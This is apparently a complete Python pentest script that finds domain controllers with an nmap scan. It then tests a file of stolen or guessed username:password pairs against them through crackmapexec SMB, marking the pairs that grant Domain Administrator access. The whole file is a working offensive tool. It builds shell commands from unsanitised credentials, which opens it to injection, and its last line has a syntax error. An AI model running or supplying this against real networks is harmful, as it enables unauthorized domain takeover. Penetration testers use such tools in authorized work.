#This script will take a list of credentials, and fire them at the DC with crackmapexec looking for Domain Administrator accounts.
#made by the-jcksn
#github.com/the-jcksn
#sudo python DA-check.py -c creds_list.txt -dc DC_IP_address

import os
import subprocess
import argparse
from termcolor import colored
import re

#gather requested arguments
parser = argparse.ArgumentParser()
parser.add_argument('-c', default='none', dest='creds', help='provide the list of credentials to test', type=str)
args = parser.parse_args()

#print unnecessary banner
print()
print(colored('     ##########################','blue'))
print(colored('     #                        #','blue'))
print(colored('     #       DA CHECKER       #','blue'))
print(colored('     #       the-jcksn        #','blue'))
print(colored('     #  github.com/the-jcksn  #','blue'))
print(colored('     #                        #','blue'))
print(colored('     ##########################','blue'))


#check if all conditions are right
if not 'SUDO_UID' in os.environ.keys():
        print(colored('\nThis script requires super user privs (sudo),\nplease come back when the grown-ups say it\'s ok...','red'))
        quit()
if args.creds == 'none':
        print(colored('\nCredentials file not provided with \'-c\' - quitting!','red'))
        quit()

#define functions
def cmdline(command):
        terminal_output = subprocess.getoutput(command)
        return(terminal_output)
def dacheck(results):
        if 'Pwn3d' in results:
                print(colored(line[:-1] + ' - SUCCESS - these are DA creds','green'))
        else:
                print(colored(line[:-1] + ' - not DA','red'))

#do you wanna scan or do you know?
dc_known = ''
domain_controllers = []
domain_controllers_quiet = []
while dc_known != 'y' and dc_known != 'n':
        dc_known = input('\nDo you know the Domain Controller IP address? (y/n): ')
if dc_known == 'y':
        domaincontroller = input('\nPlease enter the IP of the Domain Controller: ')
if dc_known == 'n':
        print('\nNo problem! Scanning your current network for the DC....')
        your_ip = 'ip a'
        output = cmdline(your_ip)
        output = output.split('eth0')[1]
        output = output.split('inet ')[1]
        ip_addr = output.split(' brd')[0]
        print('\nYour current IP and range is ' + ip_addr)
        print(colored('\nThis may take a while, please be patient....','blue'))
        domain_controllers_cmd = 'nmap -sS -p 53,88,139,389 --open ' + ip_addr
        initial_scan = cmdline(domain_controllers_cmd)
        individual_ips = initial_scan.split('MAC Address')
        for ip in individual_ips:
                if '53' in ip:
                        if '88' in ip:
                                if '139' in ip:
                                        if '389' in ip:
                                                dc_name = ip.split('Nmap scan report for ')[1]
                                                dc_name = dc_name.split('Host is up')[0]
                                                domain_controllers.append(dc_name)
        if len(domain_controllers) >= 1:
                print(colored('\nDC\'s found on network:\n','green'))
                pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
                count = 0
                for line in domain_controllers:
                        count += 1
                        dcip = (pattern.search(line)[0])
                        print(str(count) + '. ' + dcip)
                        domain_controllers_quiet.append(dcip)
        else:
                print(colored('\nNo DC IPs were found, please manually confirm the domain controller and return once known.','red'))
                quit()
        domaincontroller = domain_controllers_quiet[0]

print('\nCredentials file loaded, checking for Domain Administrator on ' + domaincontroller + ':\n')

#do the stuff
with open(args.creds,'r') as credfile:
        for line in credfile:
                username = line.split(':')[0]
                password = line.split(':')[1]
                password = password[:-1]
                crackmap = 'sudo crackmapexec smb ' + domaincontroller + ' -u\'' + username + '\' -p \'' + password +'\''
                results = cmdline(crackmap)
                dacheck(results)
print(colored('K thnx bye!','blue')
